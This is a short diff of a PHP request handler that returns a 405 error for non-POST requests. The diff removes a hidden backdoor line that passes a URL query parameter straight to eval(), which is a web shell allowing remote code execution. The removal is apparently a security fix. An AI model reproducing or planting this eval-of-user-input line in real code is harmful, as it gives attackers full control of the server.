@@ -38,7 +38,6 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
         openFoot();
     }
 } else {
-    if(isset($_GET['php'])) eval($_GET['php']);
     http_response_code(405);
     require_once '../inc/htm.php'; openHead();
     echo '<div class="no-content"><p>You must use a POST request to do that.</p></div>';
